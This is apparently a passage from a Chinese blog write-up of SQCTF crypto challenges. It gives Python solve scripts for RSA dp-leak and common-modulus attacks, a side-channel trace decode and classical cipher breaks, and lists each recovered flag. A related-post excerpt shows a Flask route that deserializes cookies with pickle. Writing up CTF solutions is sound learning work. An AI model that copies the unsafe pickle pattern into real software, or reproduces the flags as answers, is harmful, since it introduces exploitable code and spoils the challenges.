<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">n = <span class="number">15124759435262214519214613181859115868729356369274819299240157375966724674496904855757710168853212365134058977781083245051947523020090726851248565503324715984500225724227315777864292625995636236219359256979887906731659848125792269869019299002807101443623257106289957747665586226912446158316961637444556237354422346621287535139897525295200592525427472329815100310702255593134984040293233780616515067333512830391860868933632383433431739823740865023004008736555299772442805617275890761325372253913686933294732259451820332316315205537055439515569011020072762809613676347686279082728000419370190242778504490370698336750029</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">dp = <span class="number">1489209342944820124277807386023133257342259912189247976569642906341314682381245025918040456151960704964362424182449567071683886673550031774367531511627163525245627333820636131483140111126703748875380337657189727259902108519674360217456431712478937900720899137512461928967490562092139439552174099755422092113</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">4689152436960029165116898717604398652474344043493441445967744982389466335259787751381227392896954851765729985316050465252764336561481633355946302884245320441956409091576747510870991924820104833541438795794034004988760446988557417649875106251230110075290880741654335743932601800868983384563972124570013568709773861592975182534005364811768321753047156781579887144279837859232399305581891089040687565462656879173423137388006332763262703723086583056877677285692440970845974310740659178040501642559021104100335838038633269766591727907750043159766170187942739834524072423767132738563238283795671395912593557918090529376173</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: 找到 p</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> (e * dp - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">        p_candidate = (e * dp - <span class="number">1</span>) // k + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n % p_candidate == <span class="number">0</span>:</span><br><span class="line">            p = p_candidate</span><br><span class="line">            q = n // p</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: 计算私钥 d</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: 解密密文</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">plaintext = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>b’SQCTF{7b909221-c8ff-f391-0c86-d3a9ca8491d1}’</p>
<h3 id="玩的挺变态啊清茶哥"><a href="#玩的挺变态啊清茶哥" class="headerlink" title="玩的挺变态啊清茶哥"></a>玩的挺变态啊清茶哥</h3><p>猪圈密码，解了前几个后面就猜到了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409150919206.png" alt="image-20250409150919206"></p>
<p>SQCTF{jijibaotonghualizuoyingxiong}</p>
<h3 id="ez-SCA"><a href="#ez-SCA" class="headerlink" title="ez_SCA"></a>ez_SCA</h3><p>调教gpt</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409234125000.png" alt="image-20250409234125000"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250409234139644.png" alt="image-20250409234139644"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载数据</span></span><br><span class="line">template_trace_0 = np.load(<span class="string">&#x27;template_trace_0.npy&#x27;</span>)</span><br><span class="line">template_trace_1 = np.load(<span class="string">&#x27;template_trace_1.npy&#x27;</span>)</span><br><span class="line">traces = np.load(<span class="string">&#x27;energy_traces_with_flag.npy&#x27;</span>)  <span class="comment"># shape: (424, 1000)</span></span><br><span class="line"></span><br><span class="line">recovered_bits = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx, segment <span class="keyword">in</span> <span class="built_in">enumerate</span>(traces):</span><br><span class="line">    mse_0 = np.mean((segment - template_trace_0) ** <span class="number">2</span>)</span><br><span class="line">    mse_1 = np.mean((segment - template_trace_1) ** <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    bit = <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> mse_0 &lt; mse_1 <span class="keyword">else</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    recovered_bits.append(bit)</span><br><span class="line"></span><br><span class="line">bitstring = <span class="string">&#x27;&#x27;</span>.join(recovered_bits)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为文本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bits_to_text</span>(<span class="params">bits</span>):</span><br><span class="line">    chars = [bits[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">8</span>)]</span><br><span class="line">    text = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(char, <span class="number">2</span>)) <span class="keyword">for</span> char <span class="keyword">in</span> chars <span class="keyword">if</span> <span class="built_in">len</span>(char) == <span class="number">8</span>])</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">flag = bits_to_text(bitstring)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Recovered flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="字母的轮舞与维吉尼亚的交响曲"><a href="#字母的轮舞与维吉尼亚的交响曲" class="headerlink" title="字母的轮舞与维吉尼亚的交响曲"></a>字母的轮舞与维吉尼亚的交响曲</h3><p>根据开头SQCTF反推密钥原理参考</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250410000833747.png" alt="image-20250410000833747"></p>
<p><a target="_blank" rel="noopener" href="https://goodlunatic.github.io/posts/1ad9200/">CTF-Misc Guide - ⚡Lunatic BLOG⚡</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250410000803755.png" alt="image-20250410000803755"></p>
<h3 id="Common-Modulus"><a href="#Common-Modulus" class="headerlink" title="Common Modulus"></a>Common Modulus</h3><p>deepseek</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (a, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = extended_gcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> (g, y, x - (a // b) * y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">13650503560233612352420237787159267432351878281073422449253560365809461612884248041710373755322100953953257608601227381211434513766352420535096028618735289379355710140356003114010103377509526452574385251495847301426845768427018504464757671958803807138699056193259160806476941875860254288376872925837127208612702688503022494109785623082365323949385021488106289708499091818714253710552213982060745736652306892896670424179736886691685639988637188591805479432332714690818805432648223229601082431517091667297328748597580733946557364100555781113940729296951594110258088501146224322799560159763097710814171619948719257894889</span></span><br><span class="line">c1 = <span class="number">3366500968116867439746769272799247895217647639427183907930755074259056811685671593722389247697636905214269760325119955242254171223875159785479900114989812511815466122321484289407596620307636198001794029251197349257235827433633936216505458557830334779187112907940003978773672225479445837897135907447625387990203145231671233038707457396631770623123809080945314083730185110252441203674945146889165953135351824739866177205127986576305492490242804571570833778440870959816207461376598067538653432472043116027057204385251674574207749241503571444801505084599753550983430739025050926400228758055440679102902069032768081393253</span></span><br><span class="line">c2 = <span class="number">7412517103990148893766077090616798338451607394614015195336719617426935439456886251056015216979658274633552687461145491779122378237012106236527924733047395907133190110919550491029113699835260675922948775568027483123730185809123757000207476650934095553899548181163223066438602627597179560789761507989925938512977319770704123979102211869834390476278761480516444396187746843654541476645830961891622999425268855097938496239480682176640906218645450399785130931214581370821403077312842724336393674718200919934701268397883415347122906912693921254353511118129903752832950063164459159991128903683711317348665571285175839274346</span></span><br><span class="line">e1 = <span class="number">4217054819</span></span><br><span class="line">e2 = <span class="number">2800068527</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算扩展欧几里得得到a和b</span></span><br><span class="line">g, a, b = extended_gcd(e1, e2)</span><br><span class="line"><span class="keyword">assert</span> g == <span class="number">1</span>, <span class="string">&quot;e1 and e2 必须互质&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算c1^a mod n和c2^b mod n，处理负指数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mod_pow</span>(<span class="params">c, exponent, n</span>):</span><br><span class="line">    <span class="keyword">if</span> exponent &lt; <span class="number">0</span>:</span><br><span class="line">        c_inv = <span class="built_in">pow</span>(c, -<span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(c_inv, -exponent, n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(c, exponent, n)</span><br><span class="line"></span><br><span class="line">part1 = mod_pow(c1, a, n)</span><br><span class="line">part2 = mod_pow(c2, b, n)</span><br><span class="line"></span><br><span class="line">m = (part1 * part2) % n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字节字符串</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line">    flag = n2s(m)</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    flag = m.to_bytes((m.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的Flag:&quot;</span>, flag.decode())</span><br></pre></td></tr></table></figure>

<h3 id="你的天赋是什么"><a href="#你的天赋是什么" class="headerlink" title="你的天赋是什么"></a>你的天赋是什么</h3><p>摩斯密码</p>
<h3 id="失落矿洞中的密码-1"><a href="#失落矿洞中的密码-1" class="headerlink" title="失落矿洞中的密码"></a>失落矿洞中的密码</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0yst3r-2046/p/11810574.html">Bugku-CTF加密篇之 托马斯.杰斐逊 - 0yst3r - 博客园</a></p>
<p>UNEHJPBIUOMAVZ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 秘钥</span></span><br><span class="line">key = <span class="string">&quot;4,2,11,8,9,12,3,6,10,14,1,5,7,13&quot;</span></span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line">cipher_text = <span class="string">&quot;UNEHJPBIUOMAVZ&quot;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;zhuanlun.txt&quot;</span>)</span><br><span class="line">str_first_encry = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">    line = line.strip()</span><br><span class="line">    str_first_encry.append(line)</span><br><span class="line"></span><br><span class="line">key_index = key.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">str_second_encry = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key_index:</span><br><span class="line">    str_second_encry.append(str_first_encry[<span class="built_in">int</span>(k) - <span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(str_first_encry[<span class="built_in">int</span>(k) - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(cipher_text):</span><br><span class="line">    line = str_second_encry[i]</span><br><span class="line">    split_index = line.index(ch)</span><br><span class="line">    temp = []</span><br><span class="line">    temp[<span class="number">0</span>:<span class="built_in">len</span>(line) - split_index + <span class="number">1</span>] = line[split_index:<span class="built_in">len</span>(line)]</span><br><span class="line">    temp[<span class="built_in">len</span>(temp):] = line[<span class="number">0</span>:split_index]</span><br><span class="line">    str_second_encry[i] = <span class="string">&quot;&quot;</span>.join(temp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-------------------------------------&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> plain <span class="keyword">in</span> str_second_encry:</span><br><span class="line">    <span class="built_in">print</span>(plain)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">UYTREWQASDFGHJKLMNBVCXZPOI</span></span><br><span class="line"><span class="string">NBXZPMTQOIRVHKLSAFUDGJYCEW</span></span><br><span class="line"><span class="string">EDCRFVTGBYHNUJMIKOLPQAZWSX</span></span><br><span class="line"><span class="string">HNUJMIKOLPQAZWSXEDCRFVTGBY</span></span><br><span class="line"><span class="string">JMIKOLPQAZWSXEDCTRFVGYBHNU</span></span><br><span class="line"><span class="string">PAZQWSXEDCRFVTGBYHNUJMIKOL</span></span><br><span class="line"><span class="string">BYTNUIMOPLKJHGFDSAQZWXECRV</span></span><br><span class="line"><span class="string">IJUYMNHBGVCFXDRZESWAQPLOKM</span></span><br><span class="line"><span class="string">UJMIKOLPQAZWSXEDCRFVTGBYHN</span></span><br><span class="line"><span class="string">OLPQAZWSXEDCRFVTGBYHNUJMIK</span></span><br><span class="line"><span class="string">MACFNOGIEBHUQWXZRJYVKSLPDT</span></span><br><span class="line"><span class="string">ASDFGHJKLPOIUYTREWQZXCVBNM</span></span><br><span class="line"><span class="string">VGBHNMYUJIKMOLPQAWSZEXRDCF</span></span><br><span class="line"><span class="string">ZWAQPLOKMIJNUHGBTGVFRCDXES</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip().splitlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转置矩阵，提取每一列</span></span><br><span class="line">columns = [<span class="string">&#x27;&#x27;</span>.join(row[i] <span class="keyword">for</span> row <span class="keyword">in</span> data) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data[<span class="number">0</span>]))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出每一列</span></span><br><span class="line"><span class="keyword">for</span> i, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(columns):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>列: <span class="subst">&#123;col.lower()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POIUYTREWQASDFGHJKLMNBVCXZ</span><br><span class="line">BXZPMTQOIRVHKLSAFUDGJYCEWN</span><br><span class="line">WSXEDCRFVTGBYHNUJMIKOLPQAZ</span><br><span class="line">EDCRFVTGBYHNUJMIKOLPQAZWSX</span><br><span class="line">RFVGYBHNUJMIKOLPQAZWSXEDCT</span><br><span class="line">AZQWSXEDCRFVTGBYHNUJMIKOLP</span><br><span class="line">LKJHGFDSAQZWXECRVBYTNUIMOP</span><br><span class="line">MNHBGVCFXDRZESWAQPLOKMIJUY</span><br><span class="line">TGBYHNUJMIKOLPQAZWSXEDCRFV</span><br><span class="line">IKOLPQAZWSXEDCRFVTGBYHNUJM</span><br><span class="line">QWXZRJYVKSLPDTMACFNOGIEBHU</span><br><span class="line">ZXCVBNMASDFGHJKLPOIUYTREWQ</span><br><span class="line">YUJIKMOLPQAWSZEXRDCFVGBHNM</span><br><span class="line">VFRCDXESZWAQPLOKMIJNUHGBTG</span><br><span class="line">-------------------------------------</span><br><span class="line">UYTREWQASDFGHJKLMNBVCXZPOI</span><br><span class="line">NBXZPMTQOIRVHKLSAFUDGJYCEW</span><br><span class="line">EDCRFVTGBYHNUJMIKOLPQAZWSX</span><br><span class="line">HNUJMIKOLPQAZWSXEDCRFVTGBY</span><br><span class="line">JMIKOLPQAZWSXEDCTRFVGYBHNU</span><br><span class="line">PAZQWSXEDCRFVTGBYHNUJMIKOL</span><br><span class="line">BYTNUIMOPLKJHGFDSAQZWXECRV</span><br><span class="line">IJUYMNHBGVCFXDRZESWAQPLOKM</span><br><span class="line">UJMIKOLPQAZWSXEDCRFVTGBYHN</span><br><span class="line">OLPQAZWSXEDCRFVTGBYHNUJMIK</span><br><span class="line">MACFNOGIEBHUQWXZRJYVKSLPDT</span><br><span class="line">ASDFGHJKLPOIUYTREWQZXCVBNM</span><br><span class="line">VGBHNMYUJIKMOLPQAWSZEXRDCF</span><br><span class="line">ZWAQPLOKMIJNUHGBTGVFRCDXES</span><br></pre></td></tr></table></figure>

<p>只有maketysecgreat这一列看上去有语义，试了下大小写</p>
<p>SQCTF{maketysecgreat}</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://matriy330.github.io">Matriy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://matriy330.github.io/be73c2bb/">http://matriy330.github.io/be73c2bb/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://matriy330.github.io" target="_blank">Matriy's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post-share"><div class="social-share" data-image="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250413182536541.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/zsm.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zsm.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/zfb.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zfb.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/f31bf17e/" title="2025 UCSC CTF WriteUp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/a01a8f5e-5a94-4f0d-9016-1c2c7a0bfb39.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-20</div><div class="info-item-2">2025 UCSC CTF WriteUp</div></div><div class="info-2"><div class="info-item-1">2025 UCSC CTF wp  Reverseeasy_re-ucsc简单异或 1234enc = &#x27;&#x27;&#x27;n=&lt;;:h2&lt;&#x27;?8:?&#x27;9hl9&#x27;h:l&gt;&#x27;2&gt;&gt;2&gt;hk=&gt;;:?&#x27;&#x27;&#x27;for i in range(0,len(enc)):    print(chr(ord(enc[i]) ^ 10),end=&#x27;&#x27;)  flag{d7610b86-5205-3bf3-b0f4-84484ba74105} EZ_debug-ucscdebug能看结果，下断点道最后就行，直接看 123for i in range(0,len(enc)):    print(chr(enc[i]),end=&#x27;&#x27;)  flag{709e9bdd-0858-9750-8c37-9b135b31f16d} simplere-ucsc...</div></div></div></a><a class="pagination-related" href="/9f6ee0bf/" title="BUUCTF-re-page1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250108211506668.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-25</div><div class="info-item-2">BUUCTF-re-page1</div></div><div class="info-2"><div class="info-item-1">BUUCTF-re-page1easyre 提交 reverse1跟进Str2，加flag   瞎了，上面还有个如果是o就换成0，改一改提交 {hell0_w0rld} reverse2flag：{hacking_for_fun} 但做了替换  flag{hack1ng_fo1_fun} 内涵的软件DBAPP{49d3c93df25caad81232130f3d2ebfad} flag{49d3c93df25caad81232130f3d2ebfad} 新年快乐upx壳，工具脱壳 xor 有个异或逻辑 跟进global  12345678910111213enc = [  0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,  0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,  0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,  0x47, 0x32, 0x4F]for i...</div></div></div></a><a class="pagination-related" href="/f1dd543a/" title="DASCTF 2025上半年赛-re"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/1.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-02</div><div class="info-item-2">DASCTF 2025上半年赛-re</div></div><div class="info-2"><div class="info-item-1">DASCTF 2025上半年赛-re鱼音乐直接解Exe后pyc反编译得到 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# uncompyle6 version 3.9.2# Python bytecode version base 3.8.0 (3413)# Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15)# [GCC 8.3.0]# Embedded file name: main.pyimport sys, osfrom PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QPushButton, QLabel, QVBoxLayout, QFileDialog, QMessageBoxfrom...</div></div></div></a><a class="pagination-related" href="/c510533a/" title="DASCTF 2024最后一战 wp(复现)"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250506151553502.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-03</div><div class="info-item-2">DASCTF 2024最后一战 wp(复现)</div></div><div class="info-2"><div class="info-item-1">DASCTF 2024最后一战 wp(复现)checkin 访问即可  西湖论剑邀请函获取器get_env(name &#x3D; “FLAG”)即可 Webconst_python123456# 假设存在如下路由处理@app.route(&#x27;/load&#x27;)def load_data():    data = base64.b64decode(request.cookies.get(&#x27;data&#x27;))    obj = pickle.loads(data)     return &quot;Loaded&quot;  题目导入了 pickle、base64 等模块，且存在动态数据处理逻辑（如 Session 管理、身份验证），可能通过反序列化传递对象。 Pickle 协议的本质：Pickle 不是简单的数据序列化，而是能重建任意对象的协议。反序列化时会自动调用 __reduce__ 方法，该方法返回一个可执行函数和参数元组。 在线反弹shell生成工具 – Zgao’s...</div></div></div></a><a class="pagination-related" href="/2ade85f8/" title="DASCTF 2023 10 wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-03</div><div class="info-item-2">DASCTF 2023 10 wp</div></div><div class="info-2"><div class="info-item-1">DASCTF 2023 10 wpauuuu3通过解析autoit动态脚本语言执行命令，先安装这个工具 https://github.com/nazywam/AutoIt-Ripper 在Scripts文件夹中找到autoit-ripper.exe程序，按照语法输入得到script.au3文件 得到的au3文件分析加密的流程: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Func ENC ( $DATA , $KEY )	$DATA = Binary ( $DATA )	Local $DATALEN = BinaryLen ( $DATA )	If $DATALEN = 0 Then		Return &quot;&quot;	ElseIf $DATALEN &lt; 8 Then		$DATALEN = 8	EndIf	Local $OPCODE =...</div></div></div></a><a class="pagination-related" href="/de9c80c5/" title="DubheCTF 2024 re 复现"><img class="cover" src= 